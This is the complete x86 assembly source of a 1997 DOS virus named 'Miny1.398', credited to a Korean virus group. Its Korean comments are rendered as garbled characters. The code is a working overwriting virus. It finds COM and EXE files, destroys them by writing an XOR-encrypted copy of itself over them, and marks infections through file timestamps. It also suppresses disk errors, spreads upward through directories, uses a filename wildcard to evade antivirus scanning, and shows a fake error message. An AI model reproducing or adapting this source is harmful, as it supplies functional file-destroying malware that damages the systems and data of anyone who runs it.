   ;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
   ;
   ;           Miny1.398                                          CVC #02  97/09
   ;
   ;
   ; Name : Miny1.398
   ; Original Author : KOV (Knight Of Virus) of SVS (Seoul Virus Society)
   ; Author : Osiris of CVC,Corea
   ; Type : Non Resident  Overwriting
   ;
   ;
   ;
   ; Miny1.432 ¤a·¡œá¯a·* ˆ*¬åÌe·¡”a. Miny1.432 “e µ*¸å ¤á¸åµA¬á ¯¡¯aÉQ ¢¬÷ Ìa·©
   ; ·i ˆqµq ¯¡Ç¡“e ˆõ·¡ ¦‰ˆa“w Ða‰A  e—i´ö”a.
   ;
   ; Miny1.397 “e Miny1.432 ·* ¢…¹AŸi ˆ*¬åÐaµv”a.
   ;
   ;  Miny1 µA¬á 24h ¤å ·¥ÈáœóËaŸi ˆa*¡À*»¡ ´g“e ¤á‹aŸi Ð*‰iÐ–”a.
   ;
   ;  Ñe¸* —¡*BÉ¡Ÿ¡µA¬á COM Ìa·© ¦*Èá ˆqµq ¯¡Ç¡¡a Ò*µA EXE Ìa·©•¡ ˆqµq¯¡Ç¥”a.
   ;  15 ˆ* ·¡¬w ˆqµq–A´ö·a¡e ¤a·¡œá¯aˆa ˆa»¡‰¡ ·¶“e ¡A¯¡»¡Ÿi Â‰*bÐe”a.
   ;
   ;  !!!! ‰w‰¡ !!!!
   ;
   ;  ‰sÁa³a‹¡ ¤a·¡œá¯a·¡£a*¡ ˆqµq–E Ìa·©·e ¸÷¬w¥¢Š* Ði ®* ´ô”a.
   ;  ¥¥ ¤a·¡œá¯a“e Ša·B¸â·¥ ¡¢¸â·a*¡ e ¬a¶w–A´á´¡ Ða¡a ·¡ ¤a·¡œá¯a*¡ ·¥Ðe
   ;  ¡¡—e À‚·±·e ¬a¶w¸aµA‰A ·¶”a.
   ;
   ;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>


    Miny1         SEGMENT PARA 'Miny1'
                  assume cs:Miny1, ds:Miny1

                  Org     100h
    Entry:        call    Decode                   ; ´qÑ¡ Î‰‹¡

    Encry_Start:
                  Mov     byte ptr S_Find,00       ; COM ˆqµq·¥ˆa, EXE ˆqµq·¥ˆa
                  mov     byte ptr Total,00        ; 3ˆ* ˆqµq
                  Mov     dx,offset Com_File       ; ¡¡—e COM Ìa·© ˆqµq
                  mov     byte ptr Infected,00     ; ˆqµq–E ˆ•®*Ÿi 0 ·a*¡ Ðe”a.
                  Jmp     Virus_Start              ; Ìa·© Àx‹¡*¡ ¸ñÏa

   ;=================================================
   ; •A·¡Èá ˆt µwµb
   ;

    Vir_Msg       DB ' Miny1 Virus - Bug Fix Version  97/08/14',0Dh,0Ah
                  DB ' (c) Copyleft 1997 by Osiris of CVC,Corea',0Dh,0Ah
                  DB '$'

    Msg           DB      'Abnormal Program Termination.',0Dh,0Ah,'$'

    ; TBAV »¥”e Ï¡Ða‹¡
    Com_File      DB      '*.c?m',00               ; ¡¡—e C?M Ìa·©
    Exe_File      DB      '*.e?e',00               ; ¡¡—e E?E Ìa·©
    Total         DB      ?                        ; ˆqµq¯¡Ç¥®*
    Infected      DB      ?                        ; »¡‹qŒa»¡ ˆqµq–E Ìa·©—i
    S_Find        DB      ?                        ; ˆqµq¯¡Ç¡‰¡ ·¶“e ¬wÈ*
    UP            DB      '..',00                  ; ¬w¶á*¡ ·¡•·

    Virus_Start:
                  xor     ax,ax
                  mov     ds,ax
                  push    DS:[0090h]               ; Int 24h ˆt ¸á¸w
                  Push    DS:[0092h]

                  mov     DS:[0090h],offset NewInt24
                  mov     DS:[0092h],cs            ; Int 24h ˆa*¡À‘

                  Push    CS                       ; cs=ds
                  Pop     DS

    Find_File:
                  Mov     ah,4Eh
                  Mov     cx,00100011B             ; Ìa·© ¢¬÷
    Find:         Int     21h
                  Jc      Find_EXE                 ; µAœá?
    ChkInfect:
                  mov     ax, DS:[0080h+1Eh]
                  cmp     ax,'OC'                  ; COMMAND.COM ·¥ˆa ?
                  jz      Find_NEXT                ; ˆqµq ¹A¶A
                  Mov     al, DS:[0080h+22]        ; ˆqµq µa¦* ˆñ¬a
                  And     al,1Fh                   ; ˆqµq–A´ö*a ?
                  Cmp     al,1Fh                   ; (62Á¡ ·¥ˆa ?)
                  Jnz     InfectFile
                  inc     byte ptr INFECTED        ; ˆqµq–E Ìa·©
    Find_NEXT:
                  Mov     ah,4Fh                   ; ”a·q Ìa·© ˆñ¬a
                  JMP     Find                     ;

    InfectFile:
                  mov     ax,4301h                 ; ¢¬÷·i ·ª‹¡/³a‹¡*¡  e—e”a.
                  xor     cx,cx                    ; DTA ˆa 0080h ¦*Èá ¯¡¸bÐa£a*¡
                  mov     dx,0080h+1eh
                  int     21h

                  mov     ax,3D02h                 ; µ¡Ïe/³a‹¡*¡ µ¡Ïe
                  int     21h

                  xchg    ax,bx                    ; AX µA Ð…—i *ý‹¡
                  mov     ax,5700h                 ; ¯¡ˆe ´è‹¡
                  int     21h
                  push    cx
                  push    dx

                  xor     ax,ax                    ; ·±·*·* ¯¡ˆe ´è‹¡ (´qÑ¡ÑÁ
                  mov     es,ax                    ; µA ¬a¶w)
                  mov     al,byte ptr ES:[046Ch]   ; 0000:046Ch
                  Push    CS                       ;
                  Pop     ES                       ;
                  mov     Key_Value,al             ; Key_Value = ´qÑ¡Ç¡ ˆt
                  call    Write_Vir                ; ¤a·¡œá¯a ³a‹¡ Ñ¡Â‰

                  pop     dx                       ; ¯¡ˆe ¥¢Š*
                  pop     cx
                  or      cx,+1Fh                  ; Á¡Ÿi 62Á¡ *¡ ¤aŽ‘
                  mov     ax,5701h                 ; ¯¡ˆe ¹¡¸÷(¶¥œ* ¯¡ˆe)
                  int     21h

                  mov     ah,3eh                   ; Ìa·© ”h‹¡
                  Int     21h
                  cmp     byte ptr Total,3         ; 3ˆ* ˆqµq¯¡Åv*a?
                  jz      Stop_Virus
                  Inc     byte ptr Total           ; 1 »wˆa
                  JMP     Find_NEXT
    Find_EXE:
                  cmp     byte ptr S_Find,1        ; 01·¡¡e EXE Ìa·©•¡ ˆqµq¯¡Åv”a.
                  Jnz     DX_EXE
                  mov     dx, offset UP            ; ¬w¶á —¡*BÉ¡Ÿ¡*¡ ·¡•·
                  mov     ah,3Bh
                  Int     21h
                  jc      Stop_Virus               ; ž*Ëa —¡*BÉ¡Ÿ¡ ·¥ˆa ?
                  mov     byte ptr S_Find,00       ; COM Ìa·© ¦*Èá ˆqµq
                  mov     dx, offset COM_File
                  jmp     Find_File
    DX_EXE:
                  Mov     byte ptr S_Find,01       ; EXE Ìa·©·i ˆqµq¯¡Åaœa.
                  Mov     dx,offset Exe_File       ;
                  Jmp     Find_File

    Stop_Virus:
                  xor     ax,ax                    ; ¶¥œ* Int 24h *¡ ¤aŽ‘
                  mov     ds,ax
                  pop     DS:[0092h]
                  pop     DS:[0090h]
                  Push    CS
                  Pop     DS
                  mov     dx, offset Msg           ; ¸÷¬w¸â·¥ µAœá*¡ ˆa¸w
                  cmp     byte ptr Infected,15     ; 15ˆ* ˆqµq¯¡Åv·a¡e ¡A¯¡»¡
                  jb      PrtMsg
                  mov     dx, offset Vir_Msg
    PrtMsg:       mov     ah,9                     ; ¡A¯¡»¡ Â‰*b
                  Int     21h

                  Mov     ah,4Ch                   ; ¤a·¡œá¯a ¹·ža
                  int     21h

    NewInt24:                                      ; Int 24h ÀáŸ¡
                  xor     al,al
                  IRET

    End_Encry:

   ;==================================================
   ;   ¤a·¡œá¯a ´qÑ¡ÑÁ ¦*¦…
   ;
    Write_Vir:    call    Decode                   ; ´qÑ¡
                  mov     ah,40h                   ; ¤a·¡œá¯a ³a‹¡
                  mov     dx, 100h
                  mov     cx, offset Vir_END - 100h;
                  Int     21h
                  call    Decode                   ; ´qÑ¡ Ð*¹A
                  RET
    Key_Value     DB      ?

    Decode:
                  mov     si, 103h                 ; ´qÑ¡ ¯¡¸b¸ñ
                  mov     di,si
                  mov     ah,Key_value             ; ´qÑ¡ Ç¡ˆt
                  mov     cx, offset End_Encry - 103h
    E_Ing:
                  lodsb                            ; ´qÑ¡ÑÁ
                  xor     al,ah
                  stosb
                  loop    E_ing
                  RET
    Vir_END:

    Miny1         ENDS
                  END     Entry
